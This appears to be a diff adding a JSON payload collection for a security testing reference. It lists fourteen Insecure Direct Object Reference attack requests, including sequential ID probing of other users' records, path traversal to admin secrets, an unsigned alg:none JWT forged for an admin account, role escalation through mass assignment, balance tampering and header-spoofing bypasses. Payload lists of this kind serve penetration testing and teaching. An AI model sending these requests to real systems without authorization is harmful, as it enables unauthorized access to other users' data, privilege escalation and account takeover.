@@ -1,0 +1,30 @@
+{
+  "meta": {
+    "name": "IDOR",
+    "icon": "🔓",
+    "description": "Insecure Direct Object Reference (IDOR) test cases, bypass patterns, and methodology reference. Covers predictable IDs, horizontal/vertical privilege escalation, GUID bypass, and mass assignment.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 14
+  },
+  "payloads": [
+    {"id":1,"code":"GET /api/users/2","description":"Sequential ID probe — change your own ID (e.g., /users/1) to another user's ID","category":"horizontal","platform":["any"],"tags":["idor","horizontal","sequential","integer"]},
+    {"id":2,"code":"GET /api/orders/1001","description":"Order ID manipulation — access another user's order by guessing adjacent ID","category":"horizontal","platform":["any"],"tags":["idor","horizontal","orders","integer"]},
+    {"id":3,"code":"GET /api/documents/../../admin/secrets","description":"IDOR combined with path traversal — some object references are used as file paths","category":"horizontal","platform":["any"],"tags":["idor","path-traversal","horizontal"]},
+    {"id":4,"code":"GET /api/profile?user_id=2","description":"User ID in query parameter — common pattern in older REST APIs","category":"horizontal","platform":["any"],"tags":["idor","horizontal","query-param"]},
+
+    {"id":5,"code":"POST /api/admin/users {\"userId\":2}","description":"Vertical IDOR — access admin endpoint by supplying a lower-privilege user's ID","category":"vertical","platform":["any"],"tags":["idor","vertical","admin","privilege"]},
+    {"id":6,"code":"GET /admin/impersonate/1","description":"Impersonation endpoint — direct access to assume another user's session","category":"vertical","platform":["any"],"tags":["idor","vertical","impersonate","admin"]},
+    {"id":7,"code":"PUT /api/users/2 {\"role\":\"admin\"}","description":"Role escalation via direct object reference — modify another user's role field","category":"vertical","platform":["any"],"tags":["idor","vertical","role","mass-assignment"]},
+
+    {"id":8,"code":"GET /api/files/550e8400-e29b-41d4-a716-446655440000","description":"UUID/GUID probing — replace your GUID with a predictable one or one found in other API responses","category":"guid-bypass","platform":["any"],"tags":["idor","guid","uuid","horizontal"]},
+    {"id":9,"code":"GET /api/export/report_2024_01_admin.pdf","description":"Predictable filename IDOR — admin/user-specific files with guessable naming patterns","category":"guid-bypass","platform":["any"],"tags":["idor","filename","predictable","horizontal"]},
+    {"id":10,"code":"Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOjF9.","description":"JWT with userId:1 (admin) — alg:none JWT for user ID 1 (admin account)","category":"guid-bypass","platform":["any"],"tags":["idor","jwt","alg-none","admin","privilege"]},
+
+    {"id":11,"code":"POST /api/profile {\"username\":\"me\",\"email\":\"me@x.com\",\"role\":\"admin\"}","description":"Mass assignment role injection — extra field in request updates privileged properties","category":"mass-assignment","platform":["any"],"tags":["idor","mass-assignment","role","privilege"]},
+    {"id":12,"code":"PUT /api/user {\"id\":1,\"isAdmin\":true,\"balance\":99999}","description":"Mass assignment parameter pollution — include admin/balance fields not meant for user editing","category":"mass-assignment","platform":["any"],"tags":["idor","mass-assignment","balance","admin"]},
+
+    {"id":13,"code":"GET /api/v1/users/1\nX-User-Id: 2\nX-Forward-For: 127.0.0.1\nX-Original-URL: /admin","description":"Header-based IDOR bypass — override user context via custom headers accepted by some frameworks","category":"bypass","platform":["any"],"tags":["idor","header","bypass","x-user-id"]},
+    {"id":14,"code":"GET /api/users/me/../2","description":"Path normalization IDOR — /me/../2 may resolve to /users/2 after server-side normalization","category":"bypass","platform":["any"],"tags":["idor","path-normalization","bypass","traversal"]}
+  ]
+}
